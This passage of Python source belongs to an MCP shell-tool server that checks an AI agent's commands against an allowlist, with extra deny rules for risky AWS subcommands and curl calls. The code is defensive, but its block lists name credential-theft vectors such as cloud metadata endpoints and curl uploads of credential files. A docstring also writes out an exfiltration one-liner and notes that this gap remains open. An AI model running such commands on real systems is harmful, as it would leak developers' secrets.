                substitutions = re.findall(r'\$\(([^)]+)\)', scan_target)
                substitutions.extend(re.findall(r'`([^`]+)`', scan_target))
                for sub_cmd in substitutions:
                    # An empty / whitespace-only capture is not a real
                    # substitution; skip rather than recursing into a
                    # nonsense "Empty command" denial.
                    if not sub_cmd.strip():
                        continue
                    print(f"Validating command substitution: '{sub_cmd}'", file=sys.stderr)
                    sub_ok, _sub_reason = self.is_command_allowed(sub_cmd)
                    if not sub_ok:
                        print(f"Command substitution '{sub_cmd}' is not allowed", file=sys.stderr)
                        first_word = sub_cmd.strip().split()[0] if sub_cmd.strip() else sub_cmd
                        return False, f"'{first_word}' (in command substitution) is not allowed"
            
            # Validate the segment itself
            
            # Validate the segment itself
            segment_allowed = False
            for pattern_name, pattern in self.safe_command_patterns.items():
                try:
                    if re.match(pattern, cmd_segment, re.IGNORECASE):
                        print(f"Segment '{cmd_segment}' matched pattern '{pattern_name}'", file=sys.stderr)
                        segment_allowed = True
                        break
                except re.error as e:
                    print(f"Regex error in pattern '{pattern_name}': {e}", file=sys.stderr)
                    continue
            
            if not segment_allowed:
                print(f"Segment '{cmd_segment}' did not match any allowed patterns", file=sys.stderr)
                first_word = cmd_segment.strip().split()[0] if cmd_segment.strip() else cmd_segment
                # Defense-in-depth: never surface a meta-pattern key as if
                # it were a command name.  If the model somehow sent the
                # literal string ``piped_commands`` (or any other internal
                # pattern label) as a token, redact it in the user-facing
                # message — it's confusing and self-referential.  Meta-
                # pattern names are the keys we exclude from
                # ``get_allowed_commands_description()``.
                _META_PATTERN_KEYS = {'piped_commands'}
                if first_word in _META_PATTERN_KEYS:
                    first_word = '<internal pattern label>'
                # When the failing segment is part of a multi-segment
                # pipeline, citing the offending segment is more
                # actionable than just the first token.  Keep the message
                # short for single-segment failures.
                if len(segments) > 1:
                    snippet = cmd_segment.strip()[:80]
                    if len(cmd_segment.strip()) > 80:
                        snippet += '…'
                    return False, f"'{first_word}' is not allowed (in pipeline segment: {snippet!r})"
                return False, f"'{first_word}' is not allowed"
        
        # All segments are valid
        print(f"All {len(segments)} segments validated successfully", file=sys.stderr)
        return True, ""
        
    
    def _aws_subcommand_blocked(self, cmd_segment: str) -> Optional[str]:
        """Return a denial reason if the segment is a high-risk aws subcommand.

        'aws' stays allowlisted for read-only use, but credential-vending,
        IAM mutation, infra deploy, and bulk data-movement subcommands are
        denied because they enable privilege escalation or exfiltration with
        the developer's credentials. Defense-in-depth, not a complete sandbox;
        YOLO mode bypasses this (it bypasses the whole allowlist).
        """
        # AWS global options that consume the FOLLOWING token as their value,
        # so "--region us-west-2 iam ..." isn't mis-read as service "us-west-2".
        _value_opts = frozenset({
            '--region', '--profile', '--output', '--endpoint-url', '--query',
            '--ca-bundle', '--cli-read-timeout', '--cli-connect-timeout',
            '--color', '--page-size', '--max-items', '--starting-token',
        })
        try:
            tokens = shlex.split(cmd_segment)
        except ValueError:
            tokens = cmd_segment.split()
        if not tokens or tokens[0] != 'aws':
            return None

        # Locate the first two positionals (service, action), skipping global
        # options and any values they consume.
        positionals = []
        i = 1
        while i < len(tokens) and len(positionals) < 2:
            tok = tokens[i]
            if tok.startswith('-'):
                if '=' not in tok and tok in _value_opts:
                    i += 1  # also skip this option's value
                i += 1
                continue
            positionals.append(tok)
            i += 1
        if not positionals:
            return None
        service = positionals[0]
        action = positionals[1] if len(positionals) > 1 else ''

        def _starts(prefixes) -> bool:
            return any(action.startswith(p) for p in prefixes)

        blocked = (
            (service == 'sts' and action.startswith('assume-role'))
            or (service == 'iam' and _starts((
                'create-', 'put-', 'attach-', 'detach-', 'update-',
                'delete-', 'add-', 'remove-', 'set-', 'upload-')))
            or (service == 's3' and action in {
                'cp', 'mv', 'sync', 'rm', 'rb', 'mb'})
            or (service == 's3api' and _starts(('put-', 'delete-', 'create-')))
            or (service == 'lambda' and action in {
                'create-function', 'update-function-code',
                'update-function-configuration', 'add-permission', 'invoke'})
            or (service == 'cloudformation' and action in {
                'deploy', 'create-stack', 'update-stack',
                'delete-stack', 'execute-change-set'})
            or (service == 'ec2' and _starts(('run-instances', 'create-')))
            or (service == 'ssm' and action in {'send-command', 'start-session'})
            or (service == 'secretsmanager' and action == 'get-secret-value')
        )
        if blocked:
            return (
                f"{('aws ' + service + ' ' + action).strip()!r} is blocked: IAM/STS "
                f"escalation, infra deploy, and bulk data-movement subcommands "
                f"are not permitted from the shell tool"
            )
        return None

    def _curl_invocation_blocked(self, cmd_segment: str) -> Optional[str]:
        """Return a denial reason for the two documented curl abuse vectors.

        Closes, with near-zero false positives:
          1. Link-local metadata (IMDS) access — 169.254.0.0/16 and the
             IPv6 IMDS address — which vends temporary IAM credentials.
          2. ``@file`` body/upload references that point at known credential
             files (-d @~/.aws/credentials and friends).

        NOT closed (inherent to allowing outbound network + file reads):
        exfiltration via command substitution, e.g.
        ``curl -d "$(cat ~/.aws/credentials)" https://x``. Closing that
        requires a curl host allowlist or sensitive-path read guards.
        YOLO mode bypasses this check.
        """
        try:
            tokens = shlex.split(cmd_segment)
        except ValueError:
            tokens = cmd_segment.split()
        if not tokens or tokens[0] != 'curl':
            return None

        # 1. Link-local / IMDS hosts anywhere in the argument vector.
        _imds_markers = (
            '169.254.',            # IPv4 link-local (IMDS 169.254.169.254,
                                   # ECS task metadata 169.254.170.2)
            '[fd00:ec2::254]', 'fd00:ec2::254',  # IPv6 IMDS
            'metadata.google.internal',          # GCP (defensive)
        )
        for tok in tokens[1:]:
            low = tok.lower()
            if any(marker in low for marker in _imds_markers):
                return (
                    "curl to link-local metadata (IMDS) is blocked: it vends "
                    "temporary IAM credentials. Use the AWS SDK/CLI read paths "
                    "instead of fetching the metadata endpoint directly"
                )

        # 2. @file references that resolve to credential material. curl reads
        #    an @-prefixed value as a file for -d/--data*, -F/--form,
        #    -T/--upload-file.
        _sensitive_fragments = (
            '/.aws/', '/.midway/', '/.ssh/', '/.ziya/keyring',
            'credentials', 'id_rsa', 'id_ed25519', '.pem',
        )
        for tok in tokens[1:]:
            # The @path may be a standalone arg (-d @file) or attached to a
            # form field (-F name=@file). Extract every @-reference.
            for at_pos in range(len(tok)):
                if tok[at_pos] != '@':
                    continue
                ref = tok[at_pos + 1:]
                if not ref:
                    continue
                expanded = os.path.expanduser(ref).lower()
                if any(frag in expanded for frag in _sensitive_fragments):
                    return (
                        f"curl @file upload of a credential path ({ref!r}) is "
                        f"blocked: this is a credential-exfiltration vector"
                    )
        return None

    def _validate_single_command(self, cmd_segment: str) -> bool:
        """Validate a single command segment against allowed patterns."""
        # Check against all allowed patterns
        for pattern_name, pattern in self.safe_command_patterns.items():
            try:
                if re.match(pattern, cmd_segment, re.IGNORECASE):
                    return True
            except re.error as e:
                print(f"Regex error in pattern '{pattern_name}': {e}", file=sys.stderr)
                continue
        
        return False

    def _build_safe_command_patterns(self) -> Dict[str, str]:
        """Build safe command patterns from allowed commands list."""
        patterns = {}
        
        # Apply default pattern to each allowed command
        for cmd in self.allowed_commands:
            # Git commands: if user explicitly added "git add", "git commit" etc.
            # to the allowlist, honour them instead of blocking via safe git ops.
            # Bare "git" means "allow all git subcommands".
            if cmd.startswith('git '):
                # Explicit git subcommand — create a permissive pattern for it
                git_subcmd = cmd[4:]  # e.g. "add", "commit -m", "push"
                pattern_key = f'git_explicit_{git_subcmd.replace(" ", "_").replace("-", "_")}'
                patterns[pattern_key] = r'^git\s+' + re.escape(git_subcmd) + r'(\s+.*)?$'
                continue  # Don't also add the default pattern
            if cmd == 'git':
                # Bare "git" — allow ALL git subcommands
                patterns['git_all'] = r'^git(\s+.*)?$'
                continue
            if cmd in self.command_pattern_overrides:
                patterns[cmd] = self.command_pattern_overrides[cmd]
            else:
                patterns[cmd] = self.default_command_pattern.format(cmd=re.escape(cmd))
        
        # Add patterns for complex shell constructs that use allowed commands
        allowed_cmd_pattern = '|'.join([re.escape(cmd) for cmd in self.allowed_commands if not cmd.startswith('git ')])
        patterns['piped_commands'] = f'^({allowed_cmd_pattern})(\\s+.*?)?(\\s*\\|\\s*({allowed_cmd_pattern})(\\s+.*?)?)*$'
        
        # Allow find with -exec using allowed commands
        patterns['find_exec'] = r'^find\s+.*-exec\s+(' + '|'.join([re.escape(cmd) for cmd in self.allowed_commands if not cmd.startswith('git ')]) + r')\s+.*$'
        
        return patterns

    def get_allowed_commands_description(self) -> str:
        """Get a human-readable description of allowed commands."""
        # Internal meta-pattern keys that aren't user-invokable command
        # names — they label structural patterns (e.g. "any allowed
        # command optionally piped to other allowed commands") and
        # would mislead the model if surfaced as if they were commands.
        _META_PATTERN_KEYS = {'piped_commands'}
        base_commands = set()
        for pattern_name in self.safe_command_patterns.keys():
            if pattern_name in _META_PATTERN_KEYS:
                continue
            if pattern_name.startswith('git_'):
                base_commands.add('git (safe operations)')
            elif pattern_name.startswith('env_'):
                base_commands.add(pattern_name[4:])  # Remove 'env_' prefix
            else:
                base_commands.add(pattern_name)
        
        return ', '.join(sorted(base_commands))
        
    async def handle_request(self, request: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Handle incoming MCP requests."""
        method = request.get("method")
        params = request.get("params", {})
        request_id = request.get("id")
        
        print(f"Received request: {method}", file=sys.stderr)
        
        if method == "initialize":
            return {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "protocolVersion": "2024-11-05",
                    "capabilities": {
                        "tools": {
                            "listChanged": True
                        }
                    },
                    "serverInfo": {
                        "name": "shell-server",
                        "version": "1.0.0"
                    }
                }
            }
        elif method == "tools/list":
            return {
                "jsonrpc": "2.0",
                "id": request_id,
                "result": {
                    "tools": [
                        {
                            "name": "run_shell_command",
                            "description": f"Execute a complete, non-interactive shell command. Commands must be self-contained with all arguments provided - do NOT use interactive mode (e.g., use 'echo \"2+2\" | bc' not just 'bc'). Allowed commands: {self.get_allowed_commands_description()}",
                            "inputSchema": {
                                "type": "object",
                                "properties": {
                                    "command": {
                                        "type": "string",
                                        "description": "A complete, non-interactive shell command with all required arguments (e.g., 'ls -la', 'grep pattern file', 'echo \"2+2\" | bc'). CRITICAL: Commands must be complete operations that do not require interactive input. For calculators like bc, pipe the expression: 'echo \"expression\" | bc'. Do not use incomplete commands or interactive modes."
                                    },
                                    "timeout": {
                                        "type": "number",
                                        "description": f"Timeout in seconds (default: {self.command_timeout}, max: {self.max_timeout}). Increase for long-running operations like large builds, recursive searches over big trees, or network requests to slow endpoints.",
                                        "default": self.command_timeout
                                    }
                                },
                                "required": ["command"]
                            }
                        }
                    ]
                }
            }
        elif method == "tools/call":
            tool_name = params.get("name")
            arguments = params.get("arguments", {})
            
            if tool_name == "run_shell_command":
                # _task_scope is a private side-channel field set by the
                # parent when a Task Card with explicit paths permissions
                # is running. Additive: paths it grants are permitted in
                # addition to the base WritePolicyManager. Pop it so it
                # never reaches the underlying shell command.
                task_scope = arguments.pop("_task_scope", None) if isinstance(arguments, dict) else None
                command = arguments.get("command")
                # Handle timeout parameter - convert string to number if needed
                timeout_param = arguments.get("timeout", self.command_timeout)
                try:
                    timeout = float(timeout_param) if timeout_param is not None else self.command_timeout
                    timeout = max(1, min(timeout, self.max_timeout))  # Clamp to [1, max]
                except (ValueError, TypeError):
                    timeout = self.command_timeout
                    print(f"Warning: Invalid timeout value '{timeout_param}', using default {self.command_timeout}s", file=sys.stderr)
                
                if not command:
                    return {
                        "jsonrpc": "2.0",
                        "id": request_id,
                        "error": {
                            "code": -32602,
                            "message": "Command is required"
                        }
                    }
                
                # Check if command is allowed
                allowed, denial_reason = self.is_command_allowed(command)
                if not allowed:
                    return {
                        "jsonrpc": "2.0",
                        "id": request_id,
                        "error": {
                            "code": -32602,
                            "message": f"🚫 BLOCKED: {denial_reason}\n\n" +
                                     f"📋 Allowed commands: {self.get_allowed_commands_description()}\n\n" +
                                     f"💡 Tip: You can configure allowed commands in the Shell Configuration settings."
                        }
                    }
                
                # Write policy check (after allowlist, before execution).
                # Apply per-call task scope (additive grant) for the
                # duration of the check, then clear it.
                self.write_checker.set_task_scope(task_scope)
                try:
                    write_ok, write_reason = (True, "") if self.yolo_mode else self.write_checker.check(
                        command, self._split_by_shell_operators
                    )
                finally:
                    self.write_checker.clear_task_scope()
                if not write_ok:
                    return {
                        "jsonrpc": "2.0",
                        "id": request_id,
                        "error": {
                            "code": -32602,
                            "message": f"🚫 WRITE BLOCKED: {write_reason}"
                        }
                    }

                try:
                    # The parent spawns a separate instance of this server per project,
                    # so our env reflects the correct project directory.
                    cwd = os.environ.get("ZIYA_USER_CODEBASE_DIR")
                    
                    print(f"Executing command: {command}", file=sys.stderr)
                    if cwd and os.path.isdir(cwd):
                        print(f"Working directory: {cwd}", file=sys.stderr)

                    result = self._execute_pipeline(command, timeout, cwd)

                    # Format output to be more shell-like
                    output = f"$ {command}\n"
                    if result.stdout:
                        output += result.stdout
                    if result.stderr:
                        output += result.stderr
                    
                    # Add exit code if non-zero
                    if result.returncode != 0:
                        output += f"\n[Exit code: {result.returncode}]"
                    
                    return {
                        "jsonrpc": "2.0",
                        "id": request_id,
                        "result": {
                            "content": [
                                {
                                    "type": "text",
                                    "text": output
                                }
                            ]
                        }
                    }
                    
                except subprocess.TimeoutExpired:
                    # Always return timeout error instead of suppressing it
                    return {
                        "jsonrpc": "2.0",
                        "id": request_id,
                        "error": {
                            "code": -32603,
                            "message": f"Command timed out after {timeout} seconds"
                        }
                    }
                except Exception as e:
                    return {
                        "jsonrpc": "2.0",
                        "id": request_id,
                        "error": {
                            "code": -32603,
                            "message": f"Error executing command: {str(e)}"
                        }
                    }
        
        # Handle notifications (no response needed)
        if method == "notifications/initialized":
            return None
            
        # Unknown method
        return {
            "jsonrpc": "2.0",
            "id": request_id,
            "error": {
                "code": -32601,
                "message": f"Method not found: {method}"
            }
        }
    
    async def run(self):
        """Run the MCP server."""
        while True:
            try:
                line = sys.stdin.readline()
                if not line:
                    print("EOF received, shutting down", file=sys.stderr)
                    break
                    
                line = line.strip()
                if not line:
                    continue
                    
                request = json.loads(line.strip())
                response = await self.handle_request(request)
                
                if response:
                    print(json.dumps(response), flush=True)
                    
            except json.JSONDecodeError:
                print("JSON decode error", file=sys.stderr)
                continue
            except Exception as e:
                error_response = {
                    "jsonrpc": "2.0",
                    "id": None,
                    "error": {
                        "code": -32603,
                        "message": f"Internal error: {str(e)}"
                    }
                }
                print(json.dumps(error_response), flush=True)


if __name__ == "__main__":
    server = ShellServer()
    asyncio.run(server.run())
